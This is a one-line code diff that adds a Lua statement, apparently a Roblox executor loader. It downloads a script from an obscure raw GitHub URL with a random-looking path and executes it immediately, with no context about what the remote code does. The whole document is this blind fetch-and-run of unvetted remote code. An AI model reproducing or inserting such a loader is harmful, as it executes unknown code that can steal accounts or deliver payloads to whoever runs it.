@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/x7dJJ9vnFH23/Random/main/iiwefef/dasda/sasd'))()
